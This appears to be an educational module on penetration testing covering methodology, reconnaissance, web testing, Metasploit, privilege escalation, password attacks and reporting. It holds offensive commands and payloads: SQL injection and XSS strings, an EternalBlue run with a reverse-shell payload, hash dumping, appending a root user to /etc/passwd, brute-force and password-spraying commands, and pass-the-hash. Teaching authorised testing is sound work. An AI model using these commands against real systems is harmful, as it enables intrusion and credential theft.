🎯 Penetration Testing Fundamentals

Penetration testing (pentest) is the authorised, simulated attack on a system, network or application to identify vulnerabilities before real attackers do. A skilled pentester thinks like an adversary — but operates within a legal and ethical framework defined by a clear scope of work.

In this module you will learn the full pentest lifecycle, OSINT and reconnaissance techniques, network and web application exploitation, post-exploitation tactics, pivoting, and how to write professional findings reports.

🔓

1. What is Penetration Testing?

A penetration test is a structured, authorised simulation of a cyberattack. Unlike a vulnerability scan, which lists weaknesses, a pentest actually attempts to exploit them — proving real-world impact and chaining vulnerabilities to reach a defined objective (e.g. domain admin, data exfiltration).

⬛ Black Box
  • No prior knowledge of the target
  • Simulates an external attacker starting from zero
  • Most realistic — but slowest and most expensive
  • Focus: perimeter, exposed services, OSINT
  • Used for: external network, red team engagements
⬜ White Box
  • Full knowledge: source code, architecture, credentials
  • Simulates a malicious insider or post-breach attacker
  • Most thorough — finds the most vulnerabilities
  • Focus: code review, logic flaws, deep configuration
  • Used for: application security reviews, compliance testing
🔲 Grey Box
  • Partial knowledge: credentials, network diagrams, docs
  • Simulates an authenticated user or compromised account
  • Best balance of depth and realism
  • Focus: authenticated attack surface, privilege escalation
  • Most common engagement type in practice
🔴 Red Team
  • Full adversary simulation over weeks or months
  • Tests people, processes AND technology
  • Includes physical, social engineering, OPSEC
  • Objective-based: reach a crown jewel, not just vuln count
  • Blue team (defenders) is typically unaware
🚫
Legal requirement — always get written authorisation first Penetration testing without explicit written permission is illegal under computer crime laws in every jurisdiction (e.g. Computer Misuse Act, CFAA). A signed Rules of Engagement (RoE) document and Scope of Work must exist before any testing begins.

2. The Pentest Methodology

All professional pentest frameworks (PTES, OWASP, NIST SP 800-115) share the same core phases. Understanding this lifecycle is essential before learning any individual technique.

Findings + Remediation
Phase 1 — Pre-Engagement (Scoping)
Define the scope (IP ranges, domains, applications), rules of engagement (time windows, excluded systems), emergency contacts, and legal authorisation. Deliverables: signed RoE, scope document.
Phase 2 — Reconnaissance
Gather intelligence about the target using passive (OSINT — no direct contact) and active (scanning — direct contact) techniques. Goal: map the attack surface before touching anything.
Phase 3 — Enumeration
Extract detailed information from discovered services: usernames, shares, version numbers, configuration details. More intrusive than recon — directly interacts with discovered services.
Phase 4 — Exploitation
Leverage discovered vulnerabilities to gain unauthorised access. This is what distinguishes a pentest from a vuln scan — proving exploitability with real impact, not just flagging a CVE.
Phase 5 — Post-Exploitation
After initial access: privilege escalation, credential harvesting, lateral movement, persistence and data exfiltration simulation. Demonstrates what a real attacker could achieve.
Phase 6 — Reporting
Document every finding with: severity rating (CVSS), proof of concept, business impact and actionable remediation steps. The report is the primary deliverable — it must be understood by both technical teams and executives.

3. Reconnaissance and OSINT

Reconnaissance is the most critical phase — the more you know about a target before touching it, the more targeted and effective your attacks. Passive recon leaves zero footprint on the target; active recon interacts directly with systems.

OSINT and Active Recon Toolkit

# ── PASSIVE RECON (no direct contact with target) ──────────────

# DNS enumeration — subdomains via public records
subfinder -d target.com -silent
amass enum -passive -d target.com
theHarvester -d target.com -b all

# Search engine dorking (Google)
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:env OR ext:cfg OR ext:bak

# Certificate transparency — discover subdomains via SSL certs
curl https://crt.sh/?q=%.target.com&output=json | jq '.[].name_value'

# Shodan — find internet-exposed services/devices
shodan search "org:\"Target Company\""
shodan search hostname:target.com port:22

# ── ACTIVE RECON (direct contact with target) ──────────────────

# Port scan — discover open services
nmap -sV -sC -T4 -oA scan_output 10.10.10.0/24

# Aggressive scan with OS detection and script engine
nmap -A -p- 10.10.10.5

# Web directory brute force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt
Key tool notes:

subfinder / amass — Enumerate subdomains passively using public DNS, certificate logs and OSINT APIs. Run before any scanning
theHarvester — Collects emails, names, subdomains, IPs from public sources (LinkedIn, Google, Shodan, etc.)
nmap -sV -sC — Service version detection (-sV) + default NSE scripts (-sC). Always save output with -oA for later reference
gobuster / feroxbuster — Brute-force hidden directories and files on web servers using wordlists from SecLists

4. Web Application Penetration Testing

Web application testing is one of the most common pentest scopes. The OWASP Top 10 defines the most critical categories. Below are the most impactful vulnerability classes with practical detection techniques.

💉 SQL Injection
  • Insert SQL syntax into input fields to manipulate DB queries
  • Test: ' OR '1'='1 or '; DROP TABLE--
  • Tool: sqlmap for automated detection and exploitation
  • Impact: full database dump, authentication bypass, RCE
  • Fix: parameterised queries / prepared statements
📜 XSS (Cross-Site Scripting)
  • Inject malicious JS into pages viewed by other users
  • Test: <script>alert(1)</script> in inputs/params
  • Types: Reflected, Stored, DOM-based
  • Impact: session hijacking, credential theft, defacement
  • Fix: output encoding, Content-Security-Policy header
🔑 Broken Authentication
  • Weak passwords, missing MFA, insecure session tokens
  • Test: credential stuffing, default creds, session fixation
  • Tools: Hydra, Burp Suite Intruder
  • Impact: account takeover, privilege escalation
  • Fix: MFA, strong password policy, secure cookie flags
🔗 IDOR / Access Control
  • Access objects belonging to other users by manipulating IDs
  • Test: change user_id=123 to user_id=124 in requests
  • Tool: Burp Suite Repeater for manual testing
  • Impact: horizontal/vertical privilege escalation, data breach
  • Fix: server-side authorisation checks on every request

Burp Suite — Core Workflow

# Burp Suite Community — essential workflow steps

1. Proxy Setup
   Browser proxy:  127.0.0.1:8080
   Install Burp CA cert in browser to intercept HTTPS

2. Spider / Crawl the application
   Target tab → right-click → Scan / Spider
   # Maps all endpoints, parameters and forms

3. Intercept and Modify Requests
   Proxy tab → Intercept ON → modify parameters
   Send to Repeater (Ctrl+R) for manual testing

4. Automated Fuzzing with Intruder
   Send to Intruder (Ctrl+I)
   # Mark injection points with §payload§
   Attack type:  Sniper (1 payload list)
                Cluster Bomb (multiple lists)

5. SQLi Detection
   sqlmap -u "https://target.com/item?id=1" --dbs
   sqlmap -r request.txt --level=5 --risk=3 --dump

6. Save findings
   Logger tab → export all requests/responses
   # Screenshot every PoC — essential for reporting

5. Network Exploitation with Metasploit

Metasploit Framework is the industry-standard exploitation platform. It provides a modular system of exploits, payloads, encoders and post-exploitation modules.

Metasploit Core Workflow

# Start Metasploit console
msfconsole

# Search for an exploit
msf6 > search eternalblue
msf6 > search type:exploit platform:windows smb

# Use and configure an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40      # Target IP
msf6 > set LHOST 10.10.14.5       # Your IP (listener)
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > run

# Post-exploitation with Meterpreter
meterpreter > sysinfo         # System information
meterpreter > getuid          # Current user
meterpreter > getsystem       # Attempt privilege escalation
meterpreter > hashdump        # Dump local password hashes
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > run post/windows/gather/credentials/credential_collector

# Pivot to internal network via SOCKS proxy
meterpreter > run auxiliary/server/socks_proxy SRVPORT=1080 VERSION=5
Metasploit module types:

exploit/ — Code that takes advantage of a specific vulnerability to gain access
payload/ — Code executed on the target after exploitation (reverse_tcp calls back to you; bind_tcp listens on the target)
post/ — Post-exploitation modules: credential dumping, privilege escalation, pivoting, persistence
auxiliary/ — Scanners, fuzzers, brute-forcers that do not directly exploit but support the engagement

6. Privilege Escalation

Privilege escalation is the process of gaining higher-level permissions after initial access. On Linux, the goal is root; on Windows, it is SYSTEM or Domain Admin.

Linux and Windows Privilege Escalation Checklist

# ── LINUX PRIVILEGE ESCALATION ─────────────────────────────────

# Automated enumeration
./linpeas.sh            # Most comprehensive Linux enum script
python3 -m http.server  # Serve files from attacker machine

# SUID binaries — executables that run as owner (often root)
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for SUID exploitation: https://gtfobins.github.io

# Sudo misconfigurations
sudo -l  # List what current user can run as root
# If: (ALL) NOPASSWD: /usr/bin/vim → sudo vim → :!/bin/bash

# Cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.*
# If a root cron executes a writable script → inject shell command

# Writable /etc/passwd → add root user
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# ── WINDOWS PRIVILEGE ESCALATION ───────────────────────────────

# Automated enumeration
.\winPEASx64.exe        # Windows privilege escalation awesome script
.\PowerUp.ps1; Invoke-AllChecks

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
.\accesschk.exe -uwcqv "Everyone" * /accepteula

# Token impersonation (SeImpersonatePrivilege)
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe    -cmd "cmd /c whoami"

7. Password Attacks and Credential Access

Credentials are a primary objective in most pentests. Whether through online brute-force, offline hash cracking or credential dumping from memory, access to valid credentials dramatically expands the attack surface.

Password Attack Techniques

# ── ONLINE ATTACKS (against live services) ─────────────────────

# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5

# Web login form brute force
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# SMB password spray (avoid lockouts — 1 password per user)
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# ── OFFLINE ATTACKS (crack dumped hashes) ──────────────────────

# Identify hash type
hashid '$2y$10$xyz...'
hashcat --identify hash.txt

# Crack NTLM hash with Hashcat (GPU-accelerated)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack (mutate wordlist: add numbers, capitalize)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack with John the Ripper
john --wordlist=rockyou.txt --format=NT hashes.txt

# ── CREDENTIAL DUMPING (post-exploitation) ─────────────────────

# Dump SAM/SYSTEM hashes (Windows — requires SYSTEM privs)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Pass-the-Hash — authenticate with NTLM hash, no plaintext needed
crackmapexec smb 10.10.10.5 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:hash'
Key concepts:

Password spraying vs brute force — Spraying tries one password against many users; brute force tries many passwords against one user. Spraying avoids account lockout policies
Pass-the-Hash (PtH) — NTLM authentication accepts the hash directly, so cracking is not always needed — just passing the hash grants access
rockyou.txt — 14 million real-world passwords leaked from the RockYou breach (2009). Still the most effective starting wordlist

8. Professional Pentest Reporting

The pentest report is the primary deliverable. It must communicate complex technical findings to both technical teams (who need to fix issues) and executives (who need to understand business risk and approve budgets).

📊 Executive Summary
  • 1–2 pages, no technical jargon
  • Overall risk posture and key findings
  • Business impact in plain language
  • Risk rating: Critical / High / Medium / Low
  • Top 3 recommended priorities
🔬 Technical Findings
  • One section per finding
  • Title, CVSS score, affected system
  • Description of the vulnerability
  • Step-by-step proof of concept (PoC)
  • Screenshots and request/response evidence
🎯 Risk Rating (CVSS)
  • Critical: 9.0–10.0 → Patch immediately
  • High: 7.0–8.9 → Patch within 30 days
  • Medium: 4.0–6.9 → Patch within 90 days
  • Low: 0.1–3.9 → Address in next cycle
  • Informational → Best practice improvement
🔧 Remediation Guidance
  • Specific, actionable fix for each finding
  • Short-term (patch/workaround) + long-term fix
  • Reference to OWASP / CWE / CVE where applicable
  • Code examples for developer-facing issues
  • Re-test recommendation after remediation
📰 Real Case
Uber Data Breach (2022) — Compromised via Social Engineering
An attacker purchased an Uber employee's credentials from the dark web, then bypassed MFA by bombarding the employee with push notifications until they accepted one (MFA fatigue). This granted access to internal Slack and admin tools. The attacker then found hardcoded AWS credentials in a PowerShell script shared on the internal network, gaining access to production infrastructure. A pentest with social engineering scope would have discovered both vectors — the MFA fatigue susceptibility and the hardcoded credentials — before a real attacker did.
